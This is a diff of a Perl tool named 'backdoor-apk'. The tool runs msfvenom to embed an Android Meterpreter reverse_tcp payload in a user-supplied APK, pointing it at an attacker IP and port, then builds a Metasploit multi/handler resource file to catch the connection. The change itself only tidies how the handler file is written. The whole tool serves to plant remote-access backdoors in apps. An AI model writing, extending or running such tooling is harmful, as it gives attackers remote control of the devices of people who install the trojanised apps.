@@ -9,10 +9,8 @@ if( $ARGV[0] eq '-h' || $ARGV[0] eq '' || $ARGV[0] eq '--help')
 print "Usage: backdoor-apk <apk> <ip/ddns> <port> <out>\n";
 exit;
 }
-
 system("msfvenom -x $apk -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $out");
-system("cat /dev/null > /tmp/x");
-system("echo use exploit/multi/handler >> /tmp/x");
+system("echo use exploit/multi/handler > /tmp/x");
 system("echo set payload android/meterpreter/reverse_tcp >> /tmp/x");
 system("echo set lhost $host >> /tmp/x");
 system("echo set lport $port >> /tmp/x");
